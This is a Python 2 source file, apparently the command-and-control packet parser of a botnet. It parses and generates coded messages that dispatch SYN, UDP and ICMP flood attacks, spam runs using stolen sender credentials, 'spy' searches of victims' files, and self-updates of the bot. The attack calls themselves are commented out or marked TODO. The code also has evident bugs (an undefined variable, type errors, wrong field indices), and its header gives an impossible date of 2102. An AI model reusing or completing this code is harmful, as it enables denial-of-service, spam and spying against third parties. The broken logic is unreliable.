#!/usr/bin/env python
#
# C&C Packet Parser: command and control protocol interpreter
#
# Date: Oct. 26, 2102
# All rights reserved.
#

import hashlib
import time

version=1
cmdlist={}
cmdccat='#'

def build_msg(msg_body):
	return '$'.join(('', 'SF', str(version), msg_body, 'SF', ''))
		
def generate_msg(start_time, expire_time, cmd, *params):
	global version, cmdccat
	cmdtuple=(str(start_time), str(expire_time), str(cmd))
	for param in params:
		cmdtuple += (str(param), )
	msg_body=cmdccat.join(cmdtuple)
	return '$'.join(('', 'SF', str(version), msg_body, 'SF', ''))

def get_ack_msg():
	curr_time = int(time.time())
	return generate_msg(curr_time, curr_time+30, 'ack')

def get_checkin_msg(server, port):
	curr_time = int(time.time())
	return generate_msg(curr_time, curr_time+30, 'checkin', server, port)
	
def parsing(pkt):
	global version
	fwd='sgl'
	strip = pkt.split('$')
	ver = int(strip[2])

	# version check
	if (ver > version):
		print "Unmatched version"
		if (strip[2] == '!pushing'):
			print "Update ... "
			#TODO: download payload or save it to file		
		#sock.sendto(update, self.client_address)
		else:
			update = "$SF$" + version + "$!pulling$SF$"
	elif (ver < version):
		update = "$SF$" + version + "$!pushing$SF$"
		# TODO: read ccpkt.py and send to the client
		# sock.sendto(update, self.client_address)

	if (ver != version):
		print "Unmatched version"
		return 'sgl'

	# '$SF$<version>$<StartTime>#<ExpireTime>#<command>#<parameter_list>#$SF$'
	# e.g. '$SF$1$201211032300#201211040100#checkin#192.168.1.101#21433$SF$'

	cmdstr = strip[3]
	m = hashlib.md5()
	m.update(cmdstr)
	cmdhsh=m.digest()
	if cmdlist.has_key(cmdhsh):
		print "Duplicated command", cmdstr
		return 'sgl'

	try:
		cmds = cmdstr.split("#")
		start = int(cmds[0])
		expire = int(cmds[1])
		mission = cmds[2].lower()

		# if expired, discard
		if expire < int(time.time()):
			print "Expired command", cmdstr
			return fwd

		if mission == "ack":
			print "ACK"
			fwd='ack'
		elif mission == "checkin":
			udpsrv=cmds[1]+':'+cmds[2]	
			# TODO, if not in my list, should I append to	
			#peers.peerlist[udpsrv]='active'
			#if len(peerlist) > 32:
			#	print 'Need to remove inactive entries' #TODO
			fwd='sgl'
		# The following is for group command
		elif (mission == "synfd"):
			# push it to task queue
			#thread.start_new_thread(synflood.floodsyn, (cmds[1], int(cmds[2]), 1024))	
			fwd='grp'
		elif (mission == "synsf"):
			# push it to task queue
			fwd='grp'
		elif (mission == "udpfd"):
			# push it to task queue
			#thread.start_new_thread(udpflood.floodudp, (cmds[1], int(cmds[2]), 1024))
			fwd='grp'
		elif (mission == "icmpfd"):
			# push it to task queue
			print "Not implemented"
			fwd='grp'
		elif (mission == "spam"):
			# push it to task queue
			# command: subject#text#content#rcvlist#sndlist#sndpwd#sndsrv#sndport#
			# spam.spamming: def spamming(subject, message, recvlist, sender, sndpwd, sndsrv, sndport):
			# thread.start_new_thread(spam.spamming, 
			#	(cmds[1], cmds[3], cmds[4].split(';'), cmds[5].split(';'), cmds[6], cmds[7], cmds[8])) 
			fwd='grp'
		elif (mission == "spy"):
			# push it to task queue
			# command: type#value#path
			# spam.spamming: def spamming(subject, message, recvlist, sender, sndpwd, sndsrv, sndport):
			#thread.start_new_thread(spy.search, (cmds[1], cmds[2], cmds[3]))
			fwd='grp'
		else:
			print "Unknow protocol:", mission 
	except:
		print "Invalid packet. Discard.", cmdstr

	if fwd == 'grp': 
		curr_time = int(time.time())
		if len(cmdlist) > 128:			
			longest = 0
			cmd=''
			for cmdh in cmdlist.keys():
				if longest < cmdlist[cmdh] - current_time:
					longest = cmdlist[cmdh]
					cmd = cmdh
			if cmd is not '':
				del cmdlist[cmd]
		cmdlist.update({cmdhsh:curr_time}) 

	return fwd

